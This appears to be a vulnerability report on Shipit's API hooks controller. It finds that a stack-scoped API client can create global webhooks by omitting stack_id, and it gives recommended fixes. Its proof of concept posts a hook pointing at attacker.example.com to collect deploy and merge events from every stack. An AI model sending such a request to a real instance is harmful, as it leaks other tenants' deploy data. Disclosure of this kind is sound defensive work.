### Title
`Api::HooksController` lets a stack-scoped `ApiClient` create/read/destroy **global** hooks, bypassing its stack confinement - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Api::HooksController` resolves the `stack_id` used to scope `Hook` records purely from the *request parameter* `params[:stack_id]`, never from the authenticated `current_api_client.stack_id`. When the parameter is simply omitted, the controller falls back to `stack_id = nil`, which is the sentinel `Hook` uses to mean "global — deliver for every stack." This mirrors the reported bug class: an operation meant to act on an *isolated* scope (a single stack) silently falls through to the *default/global* scope because the narrowing key resolves to `nil`, and the binding that is supposed to confine the actor (the `ApiClient`'s own `stack_id`) is never consulted.

### Finding Description
`ApiClient` supports being confined to a single stack via `belongs_to :stack, optional: true` / `stack_id` [1](#0-0) . `Api::BaseController` enforces this confinement for stack-oriented endpoints through `stacks`/`stack`: [2](#0-1) 

However, `Api::HooksController` does **not** route through this confined `stacks`/`stack` binding to compute the scope of the `Hook` records it operates on. Instead: [3](#0-2) 

`stack_id` here is derived solely from `params[:stack_id].present?`. If the caller omits `stack_id` from the request, `hooks` resolves to `Hook.where(stack_id: nil)` — the `global` scope defined on the `Hook` model itself: [4](#0-3) 

Global hooks receive every declared event (`deploy`, `rollback`, `task`, `commit_status`, `merge`, `pull_request`, etc.) for **every stack** managed by the Shipit instance, not just the stack the `ApiClient` was provisioned for: [5](#0-4) [6](#0-5) 

The equality that should hold is:
`stack the ApiClient is authorized for (current_api_client.stack_id)` == `stack whose Hook records the controller mutates/reads (params[:stack_id]-derived scope)`

Before the attack: an operator provisions an `ApiClient` scoped to one stack and grants it `write:hook`/`read:hook`, intending it to only manage that stack's outbound webhooks.
After the attack: the same token, by simply not sending `stack_id`, creates (or reads/destroys) a hook with `stack_id: nil`, which the `Hook.deliver`/`Hook.emit` machinery treats as applying to *all* stacks via `for_stack` (`where(stack_id: [nil, stack_id])`) [4](#0-3) , breaking the confinement the operator relied on.

### Impact Explanation
This is a High-severity escalation: it lets a credential meant to be scoped to a single stack instead read (via an attacker-controlled `delivery_url`) deploy/rollback/task/commit-status/merge events — including commit SHAs, deploy output links, and PR/merge metadata — for **every stack** in the Shipit installation. That matches "escalation into unauthorized read of stack state, task streams or deploy output" across repositories the token was never granted access to, using only a `write:hook`/`read:hook` permission that an operator would reasonably assume is bounded by the client's `stack_id`.

### Likelihood Explanation
Exploitation requires only possession of a legitimate, narrowly-scoped `ApiClient` token that has `write:hook` (to create) or `read:hook`/`write:hook` (to list/read/destroy) permissions — a routine, low-privilege credential in multi-tenant Shipit deployments where different teams/services are each issued a stack-scoped token. No additional privileges, session, or GitHub credentials are needed; the caller merely omits one optional parameter. I was not able to inspect `config/routes.rb` in this pass to confirm whether the un-nested (`stack_id`-less) route is reachable in the mounted engine's default routing, so this should be verified against the actual route table before treating the likelihood as fully confirmed; the controller logic itself, however, contains no defense against it regardless of how the route is reached.

### Recommendation
`Api::HooksController#stack_id` (and equivalently `hooks`) must incorporate `current_api_client.stack_id` as a hard upper bound, not just `params[:stack_id]`. Concretely:
- If `current_api_client.stack_id?` is true, ignore/reject any request that doesn't target that exact stack (i.e., force `stack_id = current_api_client.stack_id`, and 403/422 if the caller supplies a different or blank `stack_id`).
- Only allow `stack_id: nil` (global hook) operations for API clients that are not stack-scoped (`current_api_client.stack_id?` is false).
- Add regression tests asserting a stack-scoped `ApiClient` cannot create, read, or destroy global (`stack_id: nil`) hooks.

### Proof of Concept
1. Operator creates `ApiClient` A with `stack_id: stack_42.id` and permissions `['write:hook']`, intending it to only manage webhooks for stack 42.
2. Attacker (holder of A's token) sends:
   ```
   POST /shipit/api/hooks
   Authorization: Basic <token for ApiClient A>
   Content-Type: application/json

   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "rollback", "task", "commit_status", "merge"]
   }
   ```
   Note: no `stack_id` is supplied.
3. In `HooksController#create`, `stack_id` evaluates to `nil` because `params[:stack_id].present?` is `false`; `hooks.create(params)` creates a `Hook` with `stack_id: nil` — a global hook [7](#0-6) .
4. From then on, every `deploy`, `rollback`, `task`, `commit_status`, and `merge` event across **all** stacks in the Shipit instance — not just stack 42 — is POSTed to `https://attacker.example.com/collect`, per `Hook.deliver`'s `for_stack(stack_id)` matching (`where(stack_id: [nil, stack_id])`) [6](#0-5) .
